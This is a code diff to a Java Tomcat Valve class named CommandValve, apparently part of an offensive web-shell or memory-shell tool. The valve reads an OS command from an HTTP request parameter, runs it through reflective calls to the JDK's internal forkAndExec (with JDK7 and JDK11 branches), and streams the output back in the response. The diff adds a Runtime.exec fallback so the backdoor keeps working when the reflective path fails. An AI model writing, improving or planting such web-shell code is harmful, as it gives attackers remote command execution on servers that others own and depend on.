@@ -51,7 +51,12 @@ public class CommandValve implements Valve {
         String cmd = getParam(request.getParameter(paramName));
         try {
             if (cmd != null) {
-                InputStream inputStream = forkAndExec(cmd);
+                InputStream inputStream = null;
+                try {
+                    inputStream = forkAndExec(cmd);
+                } catch (Throwable e) {
+                    inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
+                }
                 ServletOutputStream outputStream = response.getOutputStream();
                 byte[] buf = new byte[8192];
                 int length;
@@ -125,7 +130,7 @@ public class CommandValve implements Valve {
             forkMethod.invoke(processObject, mode, helperpathObject, result, argBlock, args.length,
                     null, envc[0], null, std_fds, false);
         } catch (NoSuchFieldException e) {
-            e.printStackTrace();
+            // JDK7
             Method forkMethod = processClass.getDeclaredMethod("forkAndExec", byte[].class, byte[].class, int.class,
                     byte[].class, int.class, byte[].class, int[].class, boolean.class);
             forkMethod.setAccessible(true);
@@ -138,6 +143,7 @@ public class CommandValve implements Valve {
             initStreamsMethod.setAccessible(true);
             initStreamsMethod.invoke(processObject, std_fds);
         } catch (NoSuchMethodException e) {
+            // JDK11
             Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class, boolean.class);
             initStreamsMethod.setAccessible(true);
             initStreamsMethod.invoke(processObject, std_fds, false);
